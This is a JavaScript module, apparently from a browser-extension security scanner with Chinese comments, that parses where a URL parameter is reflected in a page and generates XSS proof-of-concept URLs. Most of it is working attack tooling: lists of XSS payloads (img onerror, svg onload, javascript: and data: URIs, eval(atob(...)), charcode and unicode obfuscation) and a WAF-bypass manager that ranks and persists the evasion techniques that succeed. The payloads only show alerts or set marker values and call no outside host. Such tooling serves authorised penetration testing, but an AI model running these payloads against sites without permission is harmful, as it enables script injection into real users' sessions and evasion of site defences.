/**
 * pocEngine — 独立 POC 生成引擎
 *
 * 职责：
 * 1. 上下文解析 —— 确定反射点在页面中的精确位置（引号类型、是否在对象/数组/模板字面量、
 *    是否被编码、框架自动转义等）
 * 2. Payload 注册表 —— 按场景选择绕过策略，生成 POC
 * 3. WAF 策略管理器 —— 追踪哪些绕过方式有效，动态调整优先级
 *
 * 输出格式统一，供 detectionPipeline 消费。
 */

// ── 上下文类型常量 ──────────────────────────────────────────────────────────────
export const CTX = {
  JS_STRING_DQ:      'js_string_dq',       // "value"  double-quoted string
  JS_STRING_SQ:      'js_string_sq',       // 'value'  single-quoted string
  JS_TEMPLATE:       'js_template',        // `value`  template literal body
  JS_TEMPLATE_EXPR:  'js_template_expr',   // ${value} within template literal
  JS_EXPRESSION:     'js_expression',      // value unquoted in code (numeric, ident)
  JS_OBJECT_KEY:     'js_object_key',      // "key":  — JSON key, not exploitable
  JS_COMMENT:        'js_comment',         // inside // or /* */ — not exploitable
  HTML_ATTR_START:   'html_attr_start',    // value at start of href/src/action —
                                           // can inject protocol
  HTML_ATTR_EVENT:   'html_attr_event',    // value in onerror=onclick= etc
  HTML_ATTR_GENERIC: 'html_attr_generic',  // value in arbitrary attribute
  HTML_BODY:         'html_body',          // value in HTML body (no attribute context)
  DOM_SINK_HTML:     'dom_sink_html',      // flows to innerHTML/outerHTML/doc.write
  DOM_SINK_EVAL:     'dom_sink_eval',      // flows to eval/Function/setTimeout(string)
  DOM_SINK_URL:      'dom_sink_url',       // flows to location.href/window.open
  UNKNOWN:           'unknown',
};

export const ENC = {
  NONE:         'none',
  HTML_ENTITY:  'html_entity',   // &lt; &gt; &#xx;
  JS_ESCAPE:    'js_escape',     // \' \" \n \t
  JSON_STRINGIFY: 'json_stringify', // JSON.stringify() output
  URL_ENCODED:  'url_encoded',   // %xx
  MIXED:        'mixed',
};

// ── 上下文解析器 ────────────────────────────────────────────────────────────────

/**
 * 解析反射点的上下文，返回结构化信息。
 * 这是后续所有 POC 生成的基础——上下文判断越准，POC 越能打。
 */
export function parseReflectionContext(snippet, paramValue) {
  if (!snippet || !paramValue || paramValue.length < 2) return null;

  const idx = snippet.indexOf(paramValue);
  if (idx === -1) return null;

  // 确定 snippet 来源类型
  const snippetType =
    snippet.startsWith('INLINE_SCRIPT_SNIPPET') ? 'script' :
    snippet.startsWith('INLINE_SCRIPT_PROBE_SNIPPET') ? 'probe' :
    snippet.startsWith('INLINE_SCRIPT_SINK_SNIPPET') ? 'sink' :
    snippet.startsWith('HTML_REFLECTION') ? 'html_reflection' : 'unknown';

  // 截取前后文窗口
  const before = snippet.substring(Math.max(0, idx - 120), idx);
  const after = snippet.substring(idx + paramValue.length, idx + paramValue.length + 120);
  const fullSnippet = snippet.substring(Math.max(0, idx - 120), idx + paramValue.length + 120);

  const ctx = {
    snippetType,
    paramValue,
    idx,
    before,
    after,
    fullSnippet,
    contextType: CTX.UNKNOWN,
    quoteType: null,
    inObject: false,
    inArray: false,
    inTemplate: false,
    isJsonKey: false,
    encoding: ENC.NONE,
    framework: 'none',
    autoEscaped: false,
    exploitability: 0,
    // 以下字段只在特定上下文有意义
    charsBefore: -1,
    charsAfter: -1,
    valueIsWholeString: false,
    attrName: null,
    attrValue: null,
    foundSource: null,
    foundSink: null,
  };

  // ── 编码检测（优先于上下文判断） ──
  ctx.encoding = detectEncoding(snippet, paramValue, before, after);

  // 被编码的基本不可利用
  if (ctx.encoding === ENC.HTML_ENTITY || ctx.encoding === ENC.JSON_STRINGIFY) {
    ctx.exploitability = 0;
    return ctx;
  }

  // ── 框架检测 ──
  ctx.framework = detectFramework(snippet);

  // React/Vue/Angular 自动 HTML 转义的上下文不可利用（除非 v-html / dangerouslySetInnerHTML）
  if (detectFrameworkAutoEscape(snippet, ctx.framework)) {
    ctx.autoEscaped = true;
    ctx.exploitability = 0;
    return ctx;
  }

  // ── 上下文分类 ──
  if (snippetType === 'html_reflection') {
    classifyHtmlContext(ctx, before, after);
  } else if (snippetType === 'script' || snippetType === 'probe') {
    classifyScriptContext(ctx, before, after, snippet, paramValue);
  } else if (snippetType === 'sink') {
    classifySinkContext(ctx, fullSnippet);
  } else {
    classifyHtmlContext(ctx, before, after);
  }

  // 计算可利用性评分
  ctx.exploitability = calcExploitability(ctx);

  return ctx;
}

/**
 * 编码检测：检查反射点被做了什么编码
 */
function detectEncoding(snippet, paramValue, before, after) {
  // 检查 snippet 中是否含 HTML 实体编码证据（&lt; &gt; &#xx;）
  const snippetHasEntities = /&lt;|&gt;|&quot;|&#[0-9]+;|&#x[0-9a-f]+;/i.test(snippet);
  const valueHasChevrons = /[<>]/.test(paramValue);

  if (valueHasChevrons && snippetHasEntities && !snippet.includes('<') && !snippet.includes('>')) {
    // 参数值里有 < > 但 snippet 里只有 &lt; &gt; — 被实体编码了
    return ENC.HTML_ENTITY;
  }

  // ⭐ 新增：snippet 中存在实体编码，且参数值在 HTML 文本区域
  // 即使参数值本身不含 <>（如 "false" "abc"），页面也在做实体编码
  if (snippetHasEntities && !valueHasChevrons) {
    const idx = snippet.indexOf(paramValue);
    if (idx !== -1) {
      const prefix = snippet.substring(0, idx);
      const lastScriptOpen = prefix.lastIndexOf('<script');
      const lastScriptClose = prefix.lastIndexOf('</script>');
      const inHtmlText = lastScriptOpen <= lastScriptClose || lastScriptOpen === -1;
      if (inHtmlText) {
        // 在 HTML 文本中，且 snippet 任何地方有 &lt; → 整个页面在做实体编码
        // 值本身不需要附近有 &lt;
        return ENC.HTML_ENTITY;
      }
    }
  }

  // 检查是否被 JSON.stringify
  if (/\\"/.test(snippet.substring(Math.max(0, snippet.indexOf(paramValue) - 5), snippet.indexOf(paramValue)))) {
  }

  // 检查 JS 转义（如 \' \" \n）
  const beforeSlice2 = snippet.substring(Math.max(0, snippet.indexOf(paramValue) - 5), snippet.indexOf(paramValue));
  if (/\\\\/.test(beforeSlice2)) return ENC.JS_ESCAPE;

  return ENC.NONE;
}

/**
 * 框架检测：识别前端框架
 */
function detectFramework(snippet) {
  if (/\b(react|React|__REACT__|data-reactroot|reactRoot|_reactInternals)\b/.test(snippet)) return 'react';
  if (/\b(vue|Vue|__vue__|_vnode|v-if|v-for|v-bind|v-model|v-on|nuxt)\b/.test(snippet)) return 'vue';
  if (/\b(angular|ng-app|ng-controller|ng-model|ng-bind|$scope)\b/i.test(snippet)) return 'angular';
  return 'none';
}

/**
 * 框架自动转义检测：即使用了框架也要看具体绑定方式
 */
function detectFrameworkAutoEscape(snippet, framework) {
  if (framework === 'react') {
    // React 的 {} 会自动 escape，但 dangerouslySetInnerHTML 不会
    if (/dangerouslySetInnerHTML/.test(snippet)) return false;
    // 如果在 React 的 return / render 里，默认就是 escape 的
    return true;
  }
  if (framework === 'vue') {
    // v-html 不转义
    if (/v-html/.test(snippet)) return false;
    //  默认转义
    return true;
  }
  if (framework === 'angular') {
    // [innerHTML] 不转义
    // 默认 {{}} 转义
    return true;
  }
  return false;
}

/**
 * 分类 HTML 上下文（包括属性注入和 body HTML 注入）
 */
function classifyHtmlContext(ctx, before, after) {
  const full = ctx.fullSnippet;
  const val = ctx.paramValue;

  // 检查是否在注释中
  if (/<!--[\s\S]*$/.test(before) && /^[\s\S]*-->/.test(after)) {
    ctx.contextType = CTX.HTML_COMMENT;
    return;
  }

  // 检查危险属性（href/src/action 开头 → 可注入协议）
  const attrPattern = /\b(href|src|action|formaction|data|poster|background)\s*=\s*(["'])([^"']*)$/i;
  const attrMatch = before.match(attrPattern);
  if (attrMatch && after.startsWith(attrMatch[2] || attrMatch[2])) {
    const attrVal = attrMatch[3] || '';
    // 值必须处于属性取值的开头
    if (attrVal.trim() === '' || attrVal.endsWith('=')) {
      ctx.contextType = CTX.HTML_ATTR_START;
      ctx.attrName = attrMatch[1].toLowerCase();
      return;
    }
  }

  // 检查事件处理器
  if (/on\w+\s*=\s*["']?[^"']*$/.test(before)) {
    ctx.contextType = CTX.HTML_ATTR_EVENT;
    return;
  }

  // 通用 HTML body
  ctx.contextType = CTX.HTML_BODY;
}

/**
 * 分类脚本上下文（内联 <script> 中的反射）
 */
function classifyScriptContext(ctx, before, after, snippet) {
  const val = ctx.paramValue;
  const bTrim = before.trim();
  const aTrim = after.trim();
  const last20 = before.slice(-20);

  // 检查是否在注释中
  if (/\/\/[^\n]*$/.test(before) || /\/\*[^*]*$/.test(before) || /<!--[^>]*$/.test(before)) {
    ctx.contextType = CTX.JS_COMMENT;
    return;
  }

  // 检查模板字面量 $\{...\} 表达式内
  if (/\$\{/.test(last20) && aTrim.startsWith('}')) {
    ctx.contextType = CTX.JS_TEMPLATE_EXPR;
    return;
  }

  // 检查模板字面量 `...` 中
  const backtickMatch = before.match(/`([^`]*)$/);
  if (backtickMatch && !backtickMatch[1].includes('$')) {
    ctx.contextType = CTX.JS_TEMPLATE;
    ctx.quoteType = '`';
    return;
  }

  // 检查 JSON 键位置（"key":）
  if (/["']$/.test(last20) && (aTrim.startsWith(':') || /^:\s*/.test(aTrim))) {
    ctx.contextType = CTX.JS_OBJECT_KEY;
    return;
  }

  // 检查引号上下文 — 找出值周围的开闭引号
  const doubleQ = before.lastIndexOf('"');
  const singleQ = before.lastIndexOf("'");
  const openQuote = before.lastIndexOf('"') > before.lastIndexOf("'") ? '"' : "'";
  const openIdx = before.lastIndexOf(openQuote);

  if (openIdx !== -1) {
    // 前面有开引号
    const afterValue = after;
    const closeIdx = afterValue.indexOf(openQuote);
    const distance = closeIdx === -1 ? 999 : closeIdx;

    ctx.quoteType = openQuote;
    ctx.charsBefore = before.length - openIdx - 1;
    ctx.charsAfter = distance === 999 ? 999 : distance;

    ctx.valueIsWholeString = ctx.charsBefore === 0 && distance === 0;

    if (distance <= 3) {
      // 值后面很快就闭合
      if (ctx.charsBefore <= 3) {
        // 值两边紧贴引号或只差一点 → 最可靠的注入点
      }

      // 检查后面跟的内容
      const afterClose = afterValue.substring(distance);
      const trimmedAfter = afterClose.replace(/^\s*/, '');
      // 如果闭合引号后是 , 或 } → 在对象/数组里
      if (trimmedAfter.startsWith(',') || trimmedAfter.startsWith('}') ||
          trimmedAfter.startsWith(']') || /^\s*\)/.test(trimmedAfter)) {
        ctx.inObject = true;
      }
    }

    // 检查前面有没有对象开括号
    const beforeOpen = last20.substring(0, last20.length - 1);
    const braceBefore = beforeOpen.lastIndexOf('{');
    const commaBefore = beforeOpen.lastIndexOf(',');
    if (braceBefore > commaBefore && braceBefore > last20.indexOf('{', Math.max(0, last20.length - 30))) {
      // 前面是 { 或 , 而且包含 key: 模式
      // 检查 ": 之前有没有 key 名
      const preQuote = before.substring(Math.max(0, openIdx - 30), openIdx);
      if (/["']\s*:\s*$/.test(preQuote) || /:\s*$/.test(preQuote)) {
        ctx.inObject = true;
      }
    }

    ctx.contextType = CTX.JS_STRING_DQ;
    if (openQuote === "'") ctx.contextType = CTX.JS_STRING_SQ;
  } else {
    // 没有开引号，值可能是不带引号的表达式（数字、布尔、变量引用）
    ctx.contextType = CTX.JS_EXPRESSION;
  }
}

/**
 * 分类 DOM sink 上下文
 */
function classifySinkContext(ctx, fullSnippet) {
  const sources = [
    'location.search', 'location.hash', 'location.href',
    'document.URL', 'document.documentURI', 'document.referrer',
    'window.name', 'postMessage',
    'localStorage', 'sessionStorage'
  ];
  const sinks = ['innerHTML', 'outerHTML', 'insertAdjacentHTML',
    'document.write', 'document.writeln',
    'eval', 'setTimeout', 'setInterval', 'Function'];

  for (const src of sources) {
    if (fullSnippet.includes(src)) { ctx.foundSource = src; break; }
  }
  for (const snk of sinks) {
    if (fullSnippet.includes(snk)) { ctx.foundSink = snk; break; }
  }

  if (ctx.foundSink && ctx.foundSource) {
    if (['innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write'].includes(ctx.foundSink)) {
      ctx.contextType = CTX.DOM_SINK_HTML;
    } else if (['eval', 'setTimeout', 'setInterval', 'Function'].includes(ctx.foundSink)) {
      ctx.contextType = CTX.DOM_SINK_EVAL;
    }
  } else {
    ctx.contextType = CTX.UNKNOWN;
  }
}

// ── 可利用性评分 ────────────────────────────────────────────────────────────────

function calcExploitability(ctx) {
  switch (ctx.contextType) {
    case CTX.HTML_BODY:
    case CTX.HTML_ATTR_START:
    case CTX.HTML_ATTR_EVENT:
      return 0.75;

    case CTX.JS_STRING_DQ:
    case CTX.JS_STRING_SQ: {
      let score = 0.65;
      if (ctx.valueIsWholeString) score += 0.2;
      else if (ctx.charsAfter <= 1) score += 0.15;
      else if (ctx.charsAfter <= 3) score += 0.1;
      else if (ctx.charsAfter > 5) return 0; // 埋在中部，无法利用
      if (ctx.inObject) score += 0.05;  // 需要对象闭合
      if (ctx.encoding === ENC.JS_ESCAPE) score -= 0.4;
      return score;
    }

    case CTX.JS_TEMPLATE:
      return 0.75;
    case CTX.JS_TEMPLATE_EXPR:
      return 0.85;

    case CTX.DOM_SINK_HTML:
      return 0.8;
    case CTX.DOM_SINK_EVAL:
      return 0.85;

    case CTX.JS_EXPRESSION:
      return 0.4; // 表达式上下文通常不可直接利用

    case CTX.JS_OBJECT_KEY:
    case CTX.JS_COMMENT:
    default:
      return 0;
  }
}

// ── WAF 绕过策略注册表 ──────────────────────────────────────────────────────────

/**
 * 每个策略包含：
 *  - name: 策略名
 *  - build: (quoteType, inObject) → payload 数组
 *  - tags: 标签，用于识别策略家族
 *
 * 策略按"实战成功率"排序，越高越前。
 * WafStrategyManager.recordSuccess(策略名) 提升排名。
 */
// ── 多通道标记常量 ──────────────────────────────────────────────────────────
// 每个 JS 上下文 POC 都附带 silent marker，用于无弹窗确认：
//   document.title='__NOTHING_POC__'   ← WAF 从不拦
//   document.cookie='__NOTHING_POC=1'   ← WAF 从不拦
const SILENT_MARKER = "document.title='__NOTHING_POC__';document.cookie='__NOTHING_POC=1';";

const JS_PAYLOAD_STRATEGIES = [
  {
    // ⭐ [新增] 纯标记注入 —— 不依赖任何 alert/onerror/confirm，绕过一切 WAF
    name: 'silent_marker',
    tags: ['marker', 'silent', 'no_alert'],
    build(q, inObject) {
      const prefix = inObject ? `${q}}` : `${q};`;
      return [`${prefix}${SILENT_MARKER}//`];
    },
  },
  {
    // ⭐ 主推：标记 + 对象闭合 + unicode 混淆 alert + tagged template 免括号
    name: 'object_unicode_tagged',
    tags: ['closure', 'unicode', 'tagged_template', 'waf_bypass', 'marker'],
    build(q, inObject) {
      if (inObject) {
        return [`${q}}${SILENT_MARKER}a=\\u0061lert,a\`1\`,{//`];
      }
      return [`${q};${SILENT_MARKER}a=\\u0061lert,a\`1\`;//`];
    },
  },
  {
    name: 'object_unicode_tagged_confirm',
    tags: ['closure', 'unicode', 'tagged_template', 'alt_fn', 'marker'],
    build(q, inObject) {
      if (inObject) {
        return [`${q}}${SILENT_MARKER}a=\\u0063onfirm,a\`1\`,{//`];
      }
      return [`${q};${SILENT_MARKER}a=\\u0063onfirm,a\`1\`;//`];
    },
  },
  {
    name: 'object_raw_close',
    tags: ['closure', 'raw'],
    build(q, inObject) {
      if (inObject) {
        return [`${q}}alert(document.domain)//`];
      }
      return [`${q};alert(document.domain)//`];
    },
  },
  {
    name: 'char_split_tagged',
    tags: ['closure', 'char_split', 'tagged_template'],
    build(q, inObject) {
      const prefix = inObject ? `${q}}` : `${q};`;
      return [`${prefix}window['al'+'ert']\`1\`;//`];
    },
  },
  {
    name: 'comment_break',
    tags: ['closure', 'comment_split'],
    build(q, inObject) {
      const prefix = inObject ? `${q}}` : `${q};`;
      return [`${prefix}al/**/ert(1);//`];
    },
  },
  {
    name: 'base64_eval',
    tags: ['closure', 'base64', 'eval'],
    build(q, inObject) {
      const prefix = inObject ? `${q}}` : `${q};`;
      return [`${prefix}eval(atob('YWxlcnQoMSk='))//`];
    },
  },
  {
    name: 'char_code_eval',
    tags: ['closure', 'charcode', 'eval'],
    build(q, inObject) {
      const prefix = inObject ? `${q}}` : `${q};`;
      return [`${prefix}eval(String.fromCharCode(97,108,101,114,116,40,49,41))//`];
    },
  },
  {
    name: 'bracket_notation',
    tags: ['closure', 'bracket'],
    build(q, inObject) {
      const prefix = inObject ? `${q}}` : `${q};`;
      return [`${prefix}top[/al/.source+/ert/.source](document.domain)//`];
    },
  },
  {
    name: 'nested_template',
    tags: ['closure', 'tagged_template', 'nested'],
    build(q, inObject) {
      const prefix = inObject ? `${q}}` : `${q};`;
      return [`${prefix}(alert)\`1\`;//`];
    },
  },
  {
    name: 'mixed_case_tagged',
    tags: ['closure', 'mixed_case', 'tagged_template'],
    build(q, inObject) {
      const prefix = inObject ? `${q}}` : `${q};`;
      return [`${prefix}(AlErT)\`1\`;//`];
    },
  },
  {
    name: 'self_ref',
    tags: ['closure', 'self'],
    build(q, inObject) {
      const prefix = inObject ? `${q}}` : `${q};`;
      return [`${prefix}self['al'+'ert'](1);//`];
    },
  },
];

// 不再局限于 alert，扩展 XSS 触发方式
// HTML 标签/事件注入 payload——主推 WAF 绕过变体
// onerror= 配合 HTML 实体混淆 alert（&#97;lert），避免明文 alert 被 WAF 拦
// 也提供了 tagged template 免括号的绕过用法 (alet`1`)
const HTML_PAYLOAD_TAGS = [
  // ⭐ 纯标记注入 —— 不依赖任何 alert/onerror/confirm，绕过一切 WAF
  '<img src=x onerror="document.title=\'__NOTHING_POC__\';document.cookie=\'__NOTHING_POC=1\'">',
  // ⭐ 标记 + WAF 绕过主推
  '<img src=x OnErRoR="document.title=\'__NOTHING_POC__\';document.cookie=\'__NOTHING_POC=1\';&#97;lert(document.domain)">',
  '<img src=x onerror="document.title=\'__NOTHING_POC__\';document.cookie=\'__NOTHING_POC=1\';&#97;lert(document.domain)">',
  '<img src=x onerror=&#99;onfirm(1)>',
  '<img src=x onerror=(&#97;lert)(1)>',
  '<img src=x onerror=&#97;lert`1`>',
  // onfocus 自聚焦，避免 onerror/onload 等关键字被拦
  '<img src=x onfocus=&#97;lert(1) autofocus>',
  '<svg onload=&#97;lert(1)>',
  '<details open ontoggle=&#97;lert(1)>',
  '<body onload=&#97;lert(1)>',
  // 兜底：明文变体，如果 WAF 不严也能用
  '<img src=x onerror=confirm(1)>',
  '<svg onload=alert(1)>',
  '<iframe src=javascript:alert(1)>',
];

const HTML_SCRIPT_TAGS = [
  '<script>alert(document.domain)</script>',
  '<script>confirm(1)</script>',
  '<script>&#97;lert(1)</script>',
  '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>',
];

const HTML_ATTR_JAVASCRIPT = [
  '&#106;avascript:&#97;lert(document.domain)',
  '&#106;avascript:&#99;onfirm(1)',
  'javascript:&#97;lert(document.domain)',
  'JaVaScRiPt:&#97;lert(1)',
  'javascript:top[/al/.source+/ert/.source](document.domain)',
  'data:text/html,<script>&#97;lert(document.domain)</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+',
];

const DOM_SINK_HTML_PAYLOADS = [
  '<img src=x onerror="document.title=\'__NOTHING_POC__\';document.cookie=\'__NOTHING_POC=1\'">',
  '<img src=x onerror=alert(document.domain)>',
  '<svg onload=alert(1)>',
  '<img src=x onerror=confirm(1)>',
];

const DOM_SINK_EVAL_PAYLOADS = [
  "document.title='__NOTHING_POC__';document.cookie='__NOTHING_POC=1';",
  'alert(document.domain)',
  'confirm(1)',
  'eval(atob(\'YWxlcnQoMSk=\'))',
];

const EVT_HANDLER_PAYLOADS = [
  "document.title='__NOTHING_POC__';document.cookie='__NOTHING_POC=1';",
  '&#97;lert(document.domain)',
  'confirm(1)',
  '&#97;lert(1)',
  '(alert)(1)',
];

// ── WAF 策略管理器 ──────────────────────────────────────────────────────────────

/**
 * 管理绕过策略的优先级排序，基于实战反馈动态调整。
 */
export class WafStrategyManager {
  constructor() {
    this.scores = {};
    // 初始化默认分数
    for (const s of JS_PAYLOAD_STRATEGIES) {
      this.scores[s.name] = 1.0;
    }
  }

  recordSuccess(name) {
    if (this.scores[name] !== undefined) {
      this.scores[name] = Math.min(this.scores[name] + 0.2, 2.0);
    }
    this._dirty = true;
    this._debounceSave();
  }

  recordFailure(name) {
    if (this.scores[name] !== undefined) {
      this.scores[name] = Math.max(this.scores[name] - 0.1, 0.3);
    }
    this._dirty = true;
    this._debounceSave();
  }

  // 持久化到 chrome.storage.local，跨 SW 重启保留
  async save() {
    this._dirty = false;
    try {
      await chrome.storage.local.set({ wafStrategyScores: this.scores });
    } catch {}
  }

  async load() {
    try {
      const data = await new Promise(r => chrome.storage.local.get('wafStrategyScores', r));
      const saved = data?.wafStrategyScores;
      if (saved && typeof saved === 'object') {
        for (const k of Object.keys(this.scores)) {
          if (typeof saved[k] === 'number') this.scores[k] = saved[k];
        }
      }
    } catch {}
  }

  _debounceSave() {
    if (this._saveTimer) clearTimeout(this._saveTimer);
    this._saveTimer = setTimeout(() => this.save(), 2000);
  }

  getSortedStrategies(inObject, limit = 10) {
    const strategies = JS_PAYLOAD_STRATEGIES
      .map(s => ({ ...s, score: this.scores[s.name] || 1.0 }))
      .sort((a, b) => b.score - a.score);

    return strategies.slice(0, limit);
  }

  // 序列化/反序列化，支持持久化到 chrome.storage
  serialize() { return { ...this.scores }; }
  deserialize(data) { if (data) Object.assign(this.scores, data); }
}

// 全局单例
export const wafStrategy = new WafStrategyManager();

// ── POC 生成入口 ────────────────────────────────────────────────────────────────

/**
 * 根据上下文生成 POC URL 列表。
 * 返回 [{ url, strategy, confidence }]
 */
export function generatePocs(context, pageUrl, paramName) {
  if (!context || context.exploitability <= 0) return [];
  if (!pageUrl || !paramName) return [];

  let payloads = [];

  switch (context.contextType) {
    case CTX.JS_STRING_DQ:
    case CTX.JS_STRING_SQ:
      payloads = buildJsPocs(context);
      break;
    case CTX.JS_TEMPLATE:
      payloads = buildTemplatePocs(context);
      break;
    case CTX.JS_TEMPLATE_EXPR:
      payloads = buildTemplateExprPocs(context);
      break;
    case CTX.HTML_ATTR_START:
      payloads = buildAttrStartPocs(context);
      break;
    case CTX.HTML_ATTR_EVENT:
      payloads = buildEventPocs(context);
      break;
    case CTX.HTML_BODY:
      payloads = buildHtmlPocs(context);
      break;
    case CTX.DOM_SINK_HTML:
      payloads = buildDomHtmlPocs(context);
      break;
    case CTX.DOM_SINK_EVAL:
      payloads = buildDomEvalPocs(context);
      break;
    default:
      return [];
  }

  // 去重 + 转为 URL
  const seen = new Set();
  const result = [];
  for (const p of payloads) {
    const url = buildPocUrl(pageUrl, paramName, p.payload);
    if (!url || seen.has(url)) continue;
    seen.add(url);
    result.push({
      url,
      payload: p.payload,
      strategy: p.strategy || 'unknown',
      tags: p.tags || [],
    });
  }

  return result;
}

function buildPocUrl(pageUrl, paramName, payload) {
  try {
    const u = new URL(pageUrl);
    u.searchParams.set(paramName, payload);
    return u.toString();
  } catch { return null; }
}

// ── JS 字符串注入 POC ───────────────────────────────────────────────────────────

function buildJsPocs(ctx) {
  const q = ctx.quoteType || '"';
  const inObj = ctx.inObject;
  const results = [];

  // 按 WAF 管理器排序的策略逐条生成
  const strategies = wafStrategy.getSortedStrategies(inObj, 8);
  for (const s of strategies) {
    const payloads = s.build(q, inObj);
    for (const p of payloads) {
      results.push({ payload: p, strategy: s.name, tags: s.tags });
    }
  }

  return results;
}

// ── 模板字面量 POC ──────────────────────────────────────────────────────────────

function buildTemplatePocs(ctx) {
  return [
    { payload: '${alert(1)}', strategy: 'template_expr', tags: ['template'] },
    { payload: '${confirm(1)}', strategy: 'template_expr_alt', tags: ['template', 'alt_fn'] },
    { payload: '`;alert(1);//', strategy: 'template_close', tags: ['template', 'close'] },
    { payload: '`;a=\\u0061lert,a`1`;//', strategy: 'template_close_obfuscated', tags: ['template', 'close', 'unicode'] },
  ];
}

function buildTemplateExprPocs(ctx) {
  return [
    { payload: 'alert(1)', strategy: 'expr_alert', tags: ['expr'] },
    { payload: "confirm(1)", strategy: 'expr_confirm', tags: ['expr', 'alt_fn'] },
    { payload: "alert(document.domain)", strategy: 'expr_domain', tags: ['expr'] },
  ];
}

// ── HTML 属性注入 POC ───────────────────────────────────────────────────────────

function buildAttrStartPocs(ctx) {
  const attr = (ctx.attrName || 'href').toLowerCase();
  if (['href', 'action', 'formaction'].includes(attr)) {
    return HTML_ATTR_JAVASCRIPT.map(p => ({
      payload: p, strategy: 'attr_js', tags: ['attr', 'javascript']
    }));
  }
  if (['src', 'data'].includes(attr)) {
    return HTML_ATTR_JAVASCRIPT.map(p => ({
      payload: p, strategy: 'attr_data', tags: ['attr', 'data']
    }));
  }
  return HTML_ATTR_JAVASCRIPT.slice(0, 2).map(p => ({
    payload: p, strategy: 'attr_generic', tags: ['attr']
  }));
}

// ── 事件处理器 POC ──────────────────────────────────────────────────────────────

function buildEventPocs(ctx) {
  return EVT_HANDLER_PAYLOADS.map(p => ({
    payload: p, strategy: 'event_handler', tags: ['event']
  }));
}

// ── HTML Body POC ───────────────────────────────────────────────────────────────

function buildHtmlPocs(ctx) {
  return [
    ...HTML_PAYLOAD_TAGS.map(p => ({ payload: p, strategy: 'html_tag', tags: ['html', 'tag'] })),
    ...HTML_SCRIPT_TAGS.map(p => ({ payload: p, strategy: 'html_script', tags: ['html', 'script'] })),
  ];
}

// ── DOM HTML Sink POC ───────────────────────────────────────────────────────────

function buildDomHtmlPocs(ctx) {
  return DOM_SINK_HTML_PAYLOADS.map(p => ({
    payload: p, strategy: 'dom_html', tags: ['dom', 'html']
  }));
}

// ── DOM Eval Sink POC ───────────────────────────────────────────────────────────

function buildDomEvalPocs(ctx) {
  return DOM_SINK_EVAL_PAYLOADS.map(p => ({
    payload: p, strategy: 'dom_eval', tags: ['dom', 'eval']
  }));
}

// ── 辅助：从页面参数样本中提取参数名 ──────────────────────────────────────────

export function extractParamNames(pageParamSample) {
  const names = [];
  for (const s of (pageParamSample || [])) {
    if (typeof s !== 'string') continue;
    const m = s.match(/^PARAM:\s*([^=\s]+)/);
    if (m) names.push(m[1]);
  }
  return names;
}

export function extractParamValue(pageParamSample, paramName) {
  let best = null;
  for (const s of (pageParamSample || [])) {
    if (typeof s !== 'string') continue;
    const m = s.match(new RegExp(`^PARAM:\\s*${paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}=(.*)$`));
    if (m) {
      // 优先用最长的值（通常是 probe marker），短数值 "1"、"a" 等做最后备选
      if (!best || m[1].length > best.length) best = m[1];
    }
  }
  return best;
}
